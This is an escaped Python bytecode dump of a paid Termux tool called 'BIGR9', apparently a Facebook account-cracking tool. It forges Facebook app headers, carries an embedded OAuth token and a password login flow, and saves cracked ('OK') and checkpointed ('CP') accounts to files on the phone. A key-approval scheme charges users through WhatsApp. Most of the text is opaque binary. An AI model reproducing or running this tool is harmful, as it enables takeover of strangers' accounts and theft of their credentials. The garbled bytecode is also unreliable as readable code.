r(\000\000\000r\324\000\000\000r\324\000\000\000x\001\000\000r\016\002\000\000r\017\002\000\000c\003\000\000\000\000\000\000\000\000\000\000\000\t\000\000\000\003\000\000\000\363\262\010\000\000\227\000\t\000t\000\000\000\000\000\000\000\000\000j\002\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000j\005\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\001t\006\000\000\000\000\000\000\000\000\233\001d\002t\t\000\000\000\000\000\000\000\000t\n\000\000\000\000\000\000\000\000\253\001\000\000\000\000\000\000\233\001d\003\235\005\253\001\000\000\000\000\000\000\001\000t\000\000\000\000\000\000\000\000\000j\002\000\000""\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000j\r\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000\001\000|\001j\017\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\004\253\001\000\000\000\000\000\000d\005\031\000\000\000}\003\t\000|\001j\017\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\004\253\001\000\000\000\000\000\000d\006\031\000\000\000}\004|\002D\000\220\003]v\000\000}\005|\005j\021\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\007|\003j\023\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000\253\002\000\000\000\000\000\000j\021\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\010|\003\253\002\000\000\000\000\000\000j\021\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\t|\004j\023\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000\253\002\000\000\000\000\000\000j\021\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\n|\004\253\002\000\000\000\000\000\000j\021\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\013|\001\253\002\000\000\000\000\000\000j\021\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\014|\001j\023\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000\253\002\000\000\000\000\000\000}\006i\000d\rt\025\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000\223\001d\016d\017\223\001d\020d\021\223\001d\022t\027\000\000\000\000\000\000\000\000t\031\000\000\000\000\000\000\000\000j\032\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\023d\024\253\002\000\000\000\000\000\000\253\001\000\000\000\000\000\000\223\001d\025t\027\000\000\000\000\000\000\000\000t\031\000\000\000\000\000\000\000\000j\032""\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\023d\024\253\002\000\000\000\000\000\000\253\001\000\000\000\000\000\000\223\001d\026d\027\223\001d\030d\031\223\001d\032d\027\223\001d\033t\027\000\000\000\000\000\000\000\000t\031\000\000\000\000\000\000\000\000j\032\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\034d\035\253\002\000\000\000\000\000\000\253\001\000\000\000\000\000\000\223\001d\036d\037\223\001d d!\223\001d\"d#\223\001d$d%\223\001d&d'\223\001d(d)\223\001d*d+\223\001d,d+\223\001d-d.i\001\245\001}\007i\000d/t\027\000\000\000\000\000\000\000\000t\035\000\000\000\000\000\000\000\000j\036\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000\253\001\000\000\000\000\000\000\223\001d0d1\223\001d2t\027\000\000\000\000\000\000\000\000t\035\000\000\000\000\000\000\000\000j\036\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000\253\001\000\000\000\000\000\000\223\001d3d4\223\001d5t\027\000\000\000\000\000\000\000\000t\035\000\000\000\000\000\000\000\000j\036\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000\253\001\000\000\000\000\000\000\223\001d6d7\223\001d8d9\223\001d:d;\223\001d<|\000\223\001d=|\006\223\001d>d?\223\001d@dA\223\001dBdC\223\001dDt\027\000\000\000\000\000\000\000\000t\035\000\000\000\000\000\000\000\000j\036\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000\253\001\000\000\000\000\000\000\223\001dEdF\223\001dGdH\223\001dIdJ\223\001dKdLdMdNdO\234\004\245\001}\010t!\000\000\000\000\000\000\000\000j\"\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000dP|\010|\007\254Q\253\003\000\000\000\000\000\000j%\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000}\tdR|\tv\000\220\001r\014t\027\000\000\000\000\000\000\000\000|""\tdS\031\000\000\000\253\001\000\000\000\000\000\000}\nt'\000\000\000\000\000\000\000\000dT|\nz\000\000\000dUz\000\000\000|\006z\000\000\000dVz\000\000\000t)\000\000\000\000\000\000\000\000|\n\253\001\000\000\000\000\000\000z\000\000\000dWz\000\000\000\253\001\000\000\000\000\000\000\001\000dXj+\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000dY\204\000|\tdZ\031\000\000\000D\000\253\000\000\000\000\000\000\000\253\001\000\000\000\000\000\000}\013t-\000\000\000\000\000\000\000\000j.\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000t1\000\000\000\000\000\000\000\000j2\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d[\253\001\000\000\000\000\000\000\253\001\000\000\000\000\000\000j5\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000j\021\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\\d]\253\002\000\000\000\000\000\000j\021\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d^d_\253\002\000\000\000\000\000\000j\021\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d`da\253\002\000\000\000\000\000\000}\014db|\014\233\000dX|\013\233\000\235\004}\rt'\000\000\000\000\000\000\000\000dc|\rz\000\000\000\253\001\000\000\000\000\000\000\001\000t7\000\000\000\000\000\000\000\000ddde\253\002\000\000\000\000\000\000j\005\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000|\ndVz\000\000\000|\006z\000\000\000dVz\000\000\000|\rz\000\000\000dfz\000\000\000\253\001\000\000\000\000\000\000\001\000t\n\000\000\000\000\000\000\000\000j9\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000|\n\253\001\000\000\000\000\000\000\001\000\001\000nsdg|\tdh\031\000\000\000di\031\000\000\000v\000rft\027\000\000\000\000\000\000\000\000|\tdh\031\000\000\000dj\031\000\000\000dS\031\000\000\000\253\001\000\000\000\000\000\000}\nt'\000\000\000\000\000\000\000\000dk|\nz\000\000\000d""Uz\000\000\000|\006z\000\000\000dlz\000\000\000\253\001\000\000\000\000\000\000\001\000t7\000\000\000\000\000\000\000\000dmde\253\002\000\000\000\000\000\000j\005\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000|\ndVz\000\000\000|\006z\000\000\000dfz\000\000\000\253\001\000\000\000\000\000\000\001\000t:\000\000\000\000\000\000\000\000j9\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000|\n\253\001\000\000\000\000\000\000\001\000\001\000n\003\220\003\214y\004\000t\006\000\000\000\000\000\000\000\000d\006z\r\000\000a\003y\000#\000\001\000|\003}\004Y\000\220\003\214\215x\003Y\000w\001#\000t \000\000\000\000\000\000\000\000j<\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000j>\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000$\000r\030\001\000tA\000\000\000\000\000\000\000\000jB\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000dn\253\001\000\000\000\000\000\000\001\000Y\000y\000tD\000\000\000\000\000\000\000\000$\000r\n}\016Y\000d\000}\016~\016y\000d\000}\016~\016w\001w\000x\003Y\000w\001)oNz1\r\r\033[1;32m [\033[1;32mBIGR9-M2\033[1;97m\033[1;97m\033[1;32m] r\355\000\000\000r\356\000\000\000r(\000\000\000r\002\000\000\000rR\000\000\000r\357\000\000\000r\360\000\000\000r\361\000\000\000r\362\000\000\000r\363\000\000\000r\364\000\000\000r\266\001\000\000r\246\001\000\000r\247\001\000\000r\244\001\000\000r\245\001\000\000z\014X-FB-Net-HNIi N\000\000i@\234\000\000z\014X-FB-SIM-HNIz\024X-FB-Connection-Typer\275\001\000\000r\270\001\000\000z6OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895z\027X-FB-Connection-Qualityz\031X-FB-Connection-Bandwidthi\000-1\001i\200\303\311\001r\306\001\000\000r\277\001\000\000z\017x-fb-session-idzUnid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62z\021x-fb-device-group\332\0045120z\022X-FB-Friendly-Name\332\027ViewerReactionsMutationz\033X-FB-Request-Analytics-Tags\332\014graphservicez\020X-FB-HTT""P-Enginer\302\001\000\000z\016X-FB-Client-IPr\303\001\000\000z\023X-FB-Server-Clusterz\025x-fb-connection-token\332 d29d67d37eca387482a8a5b740f84f62rl\001\000\000rm\001\000\000rn\001\000\000ro\001\000\000rr\001\000\000rs\001\000\000rp\001\000\000\332\020credentials_type\332\033device_based_login_passwordr\214\001\000\000r\215\001\000\000r\216\001\000\000\332\014register_apiru\001\000\000rv\001\000\000r\242\001\000\000z-350685531728|62f8ce9f74b12f84c123cc23437a4a32r\213\001\000\000r{\000\000\000r\223\001\000\000\332\007NO_FILE\332\radvertiser_idr\226\001\000\000rV\000\000\000r\227\001\000\000r\t\000\000\000r\230\001\000\000\332\002PKrx\001\000\000r\300\001\000\000z3com.facebook.account.login.protocol.Fb4aAuthHandlerr\236\001\000\000)\004rw\001\000\000r\232\001\000\000r\234\001\000\000r\241\001\000\000r\307\001\000\000r\311\001\000\000r\314\001\000\000r\267\000\000\000r\315\001\000\000r\316\001\000\000r\302\000\000\000z\007\033[1;32mr-\000\000\000c\001\000\000\000\000\000\000\000\000\000\000\000\004\000\000\0003\000\000\000\3638\000\000\000K\000\001\000\227\000|\000]\022\000\000}\001|\001d\000\031\000\000\000d\001z\000\000\000|\001d\002\031\000\000\000z\000\000\000\226\001\227\001\001\000\214\024\004\000y\003\255\003w\001r\321\001\000\000r\216\000\000\000r\324\001\000\000s\002\000\000\000  r(\000\000\000rh\001\000\000z\031newidx.<locals>.<genexpr>\026\002\000\000s$\000\000\000\350\000\370\200\000\320\037X\321BW\270Q\240\001\240&\241\t\250#\241\r\250a\260\007\251j\325 8\321BW\371r\326\001\000\000r\327\001\000\000\351\022\000\000\000r\322\001\000\000ru\000\000\000\332\001+rg\001\000\000r\304\000\000\000\332\001-z\003sb=z\035\033[1;32m [\032] TOFFEE :-\033[1;32m z\024/sdcard/BIGR9-OK.txtr\332\001\000\000rw\000\000\000r\334\001\000\000r\335\001\000\000r\336\001\000\000\332\nerror_datar\337\001\000\000z\007\033[1;31mz\024/sdcard/BIGR9-CP.txtrZ\001\000\000)#r\342\001\000\000r\343\001\000\000r\344\001\000\000r\345\001\000\000r\266\000\000\000r\326\000\000\000r\346\001\000""\000r\322\000\000\000r\347\001\000\000r\350\001\000\000r0\000\000\000r\037\000\000\000r\035\000\000\000r \000\000\000r\360\001\000\000r\361\001\000\000r\330\000\000\000r\362\001\000\000rn\001\000\000r\214\000\000\000r\271\000\000\000r\354\001\000\000\332\006base64\332\tb64encoder\212\000\000\000\332\007urandom\332\006decoder\306\000\000\000r\317\000\000\000r\327\000\000\000r\331\000\000\000r\332\000\000\000r\312\000\000\000r\313\000\000\000r\364\001\000\000)\017r\350\000\000\000r\351\000\000\000r\352\000\000\000r\366\001\000\000r\367\001\000\000r\370\001\000\000r\371\001\000\000\332\004headr\312\001\000\000r\014\002\000\000r\267\000\000\000\332\004ckkk\332\004ssbb\332\007cookiesr&\000\000\000s\017\000\000\000               r(\000\000\000r\325\000\000\000r\325\000\000\000\005\002\000\000s\272\006\000\000\200\000\360\002#\005\r\344\010\013\217\n\211\n\327\010\030\322\010\030\366\000\000}\001A\002\364\000\000B\002E\002\364\000\000F\002I\002\365\000\000B\002J\002\360\000\000\032K\002\364\000\000\tL\002\364\000\000M\002P\002\367\000\000M\002W\002\361\000\000M\002W\002\367\000\000M\002]\002\361\000\000M\002]\002\364\000\000M\002_\002\330\r\022\217[\211[\230\023\323\r\035\230a\321\r \210\002\360\002\003\t\024\330\021\026\227\033\221\033\230S\323\021!\240!\321\021$\210B\364\006\000\023\033\210B\330\022\024\227*\221*\230W\240R\247X\241X\243Z\323\0220\327\0228\321\0228\270\027\300\022\323\022D\327\022L\321\022L\310V\320TV\327T\\\321T\\\323T^\323\022_\327\022g\321\022g\320hn\320oq\323\022r\327\022z\321\022z\360\000\000|\001B\002\360\000\000C\002H\002\363\000\000\023I\002\367\000\000\023Q\002\361\000\000\023Q\002\360\000\000R\002X\002\360\000\000Y\002^\002\367\000\000Y\002d\002\361\000\000Y\002d\002\363\000\000Y\002f\002\363\000\000\023g\002\210C\360\002\000\024X\r\220L\324\"3\323\"5\360\000\000\024X\r\260n\320Fi\360\000\000\024X\r\320jp\360\000\000s\001I\002\360\000\000\024X\r\360\000\000J\002X\002\364\000\000Z\002]\002\364\000\000^\002d\002\367\000\000^\002l\002\361\000\000^""\002l\002\360\000\000m\002r\002\360\000\000t\002y\002\363\000\000^\002z\002\363\000\000Z\002{\002\360\000\000\024X\r\360\000\000|\002J\003\364\000\000L\003O\003\364\000\000P\003V\003\367\000\000P\003^\003\361\000\000P\003^\003\360\000\000_\003d\003\360\000\000f\003k\003\363\000\000P\003l\003\363\000\000L\003m\003\360\000\000\024X\r\360\000\000n\003D\004\360\000\000F\004R\004\360\000\000\024X\r\360\000\000S\004b\004\360\000\000c\004[\005\360\000\000\024X\r\360\000\000\\\005u\005\360\000\000v\005B\006\360\000\000\024X\r\360\000\000C\006^\006\364\000\000`\006c\006\364\000\000d\006j\006\367\000\000d\006r\006\361\000\000d\006r\006\360\000\000s\006{\006\360\000\000}\006E\007\363\000\000d\006F\007\363\000\000`\006G\007\360\000\000\024X\r\360\000\000H\007Z\007\360\000\000\\\007c\007\360\000\000\024X\r\360\000\000d\007u\007\360\000\000w\007N\t\360\000\000\024X\r\360\000\000O\tb\t\360\000\000d\tj\t\360\000\000\024X\r\360\000\000k\t\t\360\000\000A\nZ\n\360\000\000\024X\r\360\000\000[\nx\n\360\000\000z\nH\013\360\000\000\024X\r\360\000\000I\013[\013\360\000\000]\013d\013\360\000\000\024X\r\360\000\000e\013u\013\360\000\000w\013}\013\360\000\000\024X\r\360\000\000~\013S\014\360\000\000U\014[\014\360\000\000\024X\r\360\000\000\\\014s\014\360\000\000u\014W\r\361\000\000\024X\r\210D\360\002\000\025U\013\220V\234S\244\024\247\032\241\032\243\034\323\035.\360\000\000\025U\013\250x\270\026\360\000\000\025U\013\300\013\314S\324QU\327Q[\321Q[\323Q]\323M^\360\000\000\025U\013\320_d\320fl\360\000\000\025U\013\320m\364\000\000B\002E\002\364\000\000F\002J\002\367\000\000F\002P\002\361\000\000F\002P\002\363\000\000F\002R\002\363\000\000B\002S\002\360\000\000\025U\013\360\000\000T\002f\002\360\000\000h\002E\003\360\000\000\025U\013\360\000\000F\003Y\003\360\000\000[\003q\003\360\000\000\025U\013\360\000\000r\003z\003\360\000\000|\003J\004\360\000\000\025U\013\360\000\000K\004R\004\360\000\000T\004W\004\360\000\000\025U\013\360\000\000X\004b\004\360\000\000d\004g\004\360\000\000\025U\013""\360\000\000h\004v\004\360\000\000x\004g\005\360\000\000\025U\013\360\000\000h\005B\006\360\000\000D\006G\006\360\000\000\025U\013\360\000\000H\006Y\006\360\000\000[\006d\006\360\000\000\025U\013\360\000\000e\006t\006\364\000\000v\006y\006\364\000\000z\006~\006\367\000\000z\006D\007\361\000\000z\006D\007\363\000\000z\006F\007\363\000\000v\006G\007\360\000\000\025U\013\360\000\000H\007d\007\360\000\000f\007i\007\360\000\000\025U\013\360\000\000j\007r\007\360\000\000t\007{\007\360\000\000\025U\013\360\000\000|\007Q\010\360\000\000S\010W\010\360\000\000\025U\013\360\000\000b\010n\010\360\000\000K\tY\t\360\000\000q\tf\n\360\000\000r\nT\013\362\000\000\025U\013\210D\334\021\031\227\035\221\035\320\037H\310d\320[_\324\021`\327\021e\321\021e\323\021g\210B\330\017\034\240\002\322\017\"\334\026\031\230\"\230U\231)\223n\220\003\334\020\025\320\0262\2603\321\0266\260u\321\026<\270S\321\026@\300\023\321\026D\304T\310#\303Y\321\026N\310|\321\026[\324\020\\\330\027\032\227x\221x\321\037X\300\"\320EV\322BW\323\037X\323\027X\220\004\334\027\035\327\027'\321\027'\254\002\257\n\251\n\2602\253\016\323\0277\327\027>\321\027>\323\027@\327\027H\321\027H\310\023\310R\323\027P\327\027X\321\027X\320Y\\\320]`\323\027a\327\027i\321\027i\320jm\320nq\323\027r\220\004\330\034\037\240\004\230v\240Q\240t\240f\320\032-\220\007\334\020\025\320\026;\270G\321\026C\324\020D\334\020\024\320\025+\250C\323\0200\327\0206\321\0206\260s\2703\261w\270s\261{\3003\261\300w\3217N\310t\3217S\324\020T\334\020\023\227\n\221\n\2303\224\017\331\020\025\330\021#\240r\250'\241{\2609\321'=\321\021=\334\026\031\230\"\230W\231+\240l\321\0323\260E\321\032:\323\026;\220\003\334\020\025\320\0302\260C\321\0267\270\005\321\026=\270c\321\026A\300,\321\026N\324\020O\334\020\024\320\025+\250C\323\0200\327\0206\321\0206\260s\2703\261w\270s\261{\3004\3217G\324\020H\334\020\023\227\n\221\n\2303\224\017\331\020\025\341\020\030\360-\000\023\033\364.\000\t\r\210a\211\007\211\004\370\3603\001\t\024\330\021\023\213B\373\3642\000\014""\024\327\013\036\321\013\036\327\013.\321\013.\362\000\001\005\027\334\010\014\217\n\211\n\2202\216\016\334\013\024\362\000\001\005\r\334\010\014\373\360\003\001\005\r\372s1\000\000\000\202A)P\020\000\301,\024P\006\000\302\000N\005P\020\000\320\006\004P\r\003\320\n\006P\020\000\320\0202Q\026\003\321\004\010Q\026\003\321\021\005Q\026\003c\000\000\000\000\000\000\000\000\000\000\000\000\005\000\000\000\003\000\000\000\363\010\004\000\000\227\000t\001\000\000\000\000\000\000\000\000t\003\000\000\000\000\000\000\000\000j\004\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000\253\001\000\000\000\000\000\000t\001\000\000\000\000\000\000\000\000t\003\000\000\000\000\000\000\000\000j\006\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000\253\001\000\000\000\000\000\000z\000\000\000}\000d\001j\t\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000|\000\253\001\000\000\000\000\000\000}\001t\013\000\000\000\000\000\000\000\000j\014\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\002\253\001\000\000\000\000\000\000j\016\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000}\002|\001|\002v\000r\013t\021\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000\001\000y\000t\003\000\000\000\000\000\000\000\000j\022\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\003\253\001\000\000\000\000\000\000\001\000t\025\000\000\000\000\000\000\000\000t\026\000\000\000\000\000\000\000\000\253\001\000\000\000\000\000\000\001\000t\025\000\000\000\000\000\000\000\000d\004\253\001\000\000\000\000\000\000\001\000t\031\000\000\000\000\000\000\000\000j\032\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\005\253\001\000\000\000\000\000\000\001\000t\003\000\000\000\000\000\000\000\000j\022\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\003\253\001\000""\000\000\000\000\000\001\000t\025\000\000\000\000\000\000\000\000t\026\000\000\000\000\000\000\000\000\253\001\000\000\000\000\000\000\001\000t\035\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000\001\000t\025\000\000\000\000\000\000\000\000d\006\253\001\000\000\000\000\000\000\001\000t\035\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000\001\000t\025\000\000\000\000\000\000\000\000d\007\253\001\000\000\000\000\000\000\001\000t\025\000\000\000\000\000\000\000\000d\010\253\001\000\000\000\000\000\000\001\000t\025\000\000\000\000\000\000\000\000d\t\253\001\000\000\000\000\000\000\001\000t\025\000\000\000\000\000\000\000\000d\n\253\001\000\000\000\000\000\000\001\000t\025\000\000\000\000\000\000\000\000d\013\253\001\000\000\000\000\000\000\001\000t\025\000\000\000\000\000\000\000\000d\014\253\001\000\000\000\000\000\000\001\000t\025\000\000\000\000\000\000\000\000d\r\253\001\000\000\000\000\000\000\001\000t\025\000\000\000\000\000\000\000\000d\016\253\001\000\000\000\000\000\000\001\000t\025\000\000\000\000\000\000\000\000d\017\253\001\000\000\000\000\000\000\001\000t\035\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000\001\000t\025\000\000\000\000\000\000\000\000d\020\253\001\000\000\000\000\000\000\001\000t\025\000\000\000\000\000\000\000\000d\021\253\001\000\000\000\000\000\000\001\000t\035\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000\001\000t\025\000\000\000\000\000\000\000\000d\022|\001z\000\000\000\253\001\000\000\000\000\000\000\001\000t\035\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000\001\000t\037\000\000\000\000\000\000\000\000d\023\253\001\000\000\000\000\000\000}\003t\037\000\000\000\000\000\000\000\000d\024\253\001\000\000\000\000\000\000\001\000t\035\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000\001\000t\031\000\000\000\000\000\000\000\000j\032\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\025\253\001\000\000\000\000\000\000\001""\000d\026|\001z\000\000\000}\004t\003\000\000\000\000\000\000\000\000j\022\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\027|\004z\000\000\000\253\001\000\000\000\000\000\000\001\000t!\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000\001\000y\000)\030NrV\000\000\000z<https://github.com/monsterrulex/BIGRA/blob/main/Approval.txtr\211\000\000\000z$\t \033[1;32m FIRST GET APPROVAL\033[1;37m rR\000\000\000z& YOU NEED TO GET APPROVED FIRST\033[1;37mz$ Key not approved contact with adminz' \033[37;41m\t WELCOME TO BIGR9\032 TOOL \033[0;mu-\000\000\000[\342\210\232]FREE WALY DOOR RAHO FREE KEY NI MILY GI z<\033[1;37m ====================================================z\036[A]Contact with me on WhatsAppz\036[B]Contact with me on Facebooku/\000\000\000[\342\210\232]SEND 450 PKR(OR) 5$ (FOR 15 DAYS APPROVEL)u\030\000\000\000[\342\210\232]JAZZCASH + BINANCE u'\000\000\000[\342\210\232]FOR OTHER COUNTRY BINANCE ACCOUNT u\036\000\000\000 \303\227Your Key is Not Approved \303\227u\"\000\000\000 \342\210\232COPY AND SEND ME IN WHATSAPP \032z$ \033[1;37m\032\032Your Key\032\032 : \033[1;36mBIGR9\032z\021 PUT YOUR NAME : z\032 \032PRESS ENTER TO SEND KEY\032g\000\000\000\000\000\000\014@z\010MR-BIGR9z\325am start https://wa.me/+923196101378?text=*HELLO*%2C%20*SIR*%20*I*%20*WANT*%20*TO*%20*YOUR*%20*BIGR9\032*%20*PAID*%20*TOOL*%20*APPROVAL*%20/%20%20*MY*%20/%20%20*NAME*%20/%20%20*IS*%20/%20%20*+nameMy*%20*Key*%20*:*%20)\021r\037\000\000\000r\212\000\000\000\332\007geteuid\332\010getloginr\354\001\000\000r\330\000\000\000\332\003get\332\004textr\314\000\000\000r\213\000\000\000r\214\000\000\000r\215\000\000\000r\312\000\000\000r\313\000\000\000r\220\000\000\000r\305\000\000\000\332\tsuperuser)\005r\360\001\000\000\332\002id\332\004DARKr\364\000\000\000\332\003tkss\005\000\000\000     r(\000\000\000r0\002\000\000r0\002\000\000*\002\000\000sn\001\000\000\200\000\334\013\016\214r\217z\211z\213|\323\013\034\234s\2442\247;\241;\243=\323\0371\321""\0131\200D\330\t\014\217\030\211\030\220$\213\036\200B\334\t\021\217\034\211\034\320\026T\323\tU\327\tZ\321\tZ\200D\330\007\t\210T\201z\334\010\014\215\006\344\010\n\217\t\211\t\220'\324\010\032\334\010\r\214d\214\013\334\010\r\320\016;\324\010<\334\010\014\217\n\211\n\2201\214\r\334\010\n\217\t\211\t\220'\324\010\032\334\010\r\214d\214\013\334\010\014\214\006\334\010\r\320\0169\324\010:\334\010\014\214\006\334\010\r\320\0204\324\0106\334\010\r\320\017=\324\010>\334\010\r\320\020=\324\010?\334\010\r\320\016N\324\010O\334\010\r\320\020.\324\0100\334\010\r\320\020.\324\0100\334\010\r\320\020?\324\010A\334\010\r\320\020(\324\010*\334\010\r\320\0207\324\0109\334\010\014\214\006\334\010\r\320\016.\324\010/\334\010\r\320\0162\324\0103\334\010\014\214\006\334\010\r\320\017@\300\022\321\017C\324\010D\304T\304V\334\017\024\320\025(\323\017)\210\004\334\010\r\320\016*\324\010+\254D\254F\334\010\014\217\n\211\n\2203\214\017\330\016\033\230B\321\016\036\210\003\334\010\n\217\t\211\t\360\000\000\023j\003\360\000\000m\003p\003\361\000\000\023p\003\364\000\000\tq\003\334\010\021\215\013r*\000\000\000)Rr\212\000\000\000rn\001\000\000r\312\000\000\000\332\004zlib\332\014PyInit_BIGR9r\342\001\000\000r\214\000\000\000r\213\000\000\000\332\002rer#\002\000\000r\360\001\000\000r\356\001\000\000r\330\000\000\000r\035\000\000\000\332\nsubprocess\332\010platform\332\022concurrent.futuresr\004\000\000\000r\321\000\000\000\332\023ModuleNotFoundErrorr\333\000\000\000r\326\000\000\000r\327\000\000\000r\345\001\000\000\332\003apkr\361\001\000\000\332\003hex\332\005upper\332\004myidr)\000\000\000r0\000\000\000\332\004ugenr\316\000\000\000\332\005agent\332\002aar\036\000\000\000\332\001b\332\001c\332\001dr!\000\000\000r&\000\000\000\332\001f\332\001g\332\001hr\343\000\000\000\332\001jrY\001\000\000\332\001l\332\010fullagntr\317\000\000\000\332\004fbks\332\007samsungr\352\001\000\000\332\014check_outputr&\002\000\000r\347\001\000\000r~\000\000\000r\000\000\000r\200\000\000\000r\201\000\000\000r""\322\000\000\000r$\000\000\000r\202\000\000\000r\203\000\000\000r\204\000\000\000r\205\000\000\000r\206\000\000\000r\207\000\000\000\332\005total\332\006selectr\364\001\000\000r\351\001\000\000r\211\000\000\000r\215\000\000\000r\220\000\000\000r\320\000\000\000\332\002ckr\271\000\000\000r\314\000\000\000r\325\000\000\000r\324\000\000\000r0\002\000\000r\216\000\000\000r*\000\000\000r(\000\000\000\332\010<module>rQ\002\000\000\001\000\000\000s\017\006\000\000\360\003\001\001\001\367\006\000\001\017\337\000\023\323\000\023\333\000\023\333\000\n\331\000\005\320\006/\324\0000\330\000\t\200\002\207\t\201\t\320\nE\324\000F\360\002\007\001\010\337\001E\327\001E\327\001E\327\001E\323\001E\334\001\025\335\001:\360\n\000\022\024\220B\220q\230\022\220\032\321\000\020\200\003\200C\210\004\210S\330\005\017\200T\207Z\201Z\203\\\327\005\025\321\005\025\220b\220q\320\005\031\327\005\037\321\005\037\323\005!\200\004\362\004\007\001\016\362\022\005\001\023\360\020\000\006\010\200\004\331\r\022\2204\216[\200E\330\013)\210\002\330\n\027\210&\217-\211-\322\0308\323\n9\210\001\330\n+\210\001\330\n\027\210&\217-\211-\362\000\000\031Z\002\363\000\000\013[\002\210\001\330\n\032\210&\327\n\032\321\n\032\2301\230c\323\n\"\210\001\330\n\027\210&\217-\211-\362\000\000\031Z\002\363\000\000\013[\002\210\001\330\nR\210\001\330\n\032\210&\327\n\032\321\n\032\2302\230b\323\n!\210\001\330\n\r\210\001\330\n\032\210&\327\n\032\321\n\032\2304\240\004\323\n%\210\001\330\n\032\210&\327\n\032\321\n\032\2302\230c\323\n\"\210\001\330\n \210\001\330\025\027\220D\230\001\230!\230\023\230B\230q\230c\240!\240\023\240Q\240C\250\001\240s\250\"\250Q\250C\260\001\250s\260!\260A\2603\260a\270\001\260s\270!\270A\2703\270a\300\001\270s\320\022C\210\010\330\010\014\217\013\211\013\220H\325\010\035\360\035\000\016\031\360 \000\006t\001\200\004\362\002\000\013G,\200\007\330\t\013\200\006\330\022)\220*\327\022)\321\022)\320*L\320SW\324\022X\327\022_\321\022_\320`g\323\022h\327\022p\321\022p\320qu\320vx\323\022y\200\017\330""\010\037\210\n\327\010\037\321\010\037\320 :\300\024\324\010F\327\010M\321\010M\310g\323\010V\327\010^\321\010^\320_c\320df\323\010g\200\005\330\010\037\210\n\327\010\037\321\010\037\320 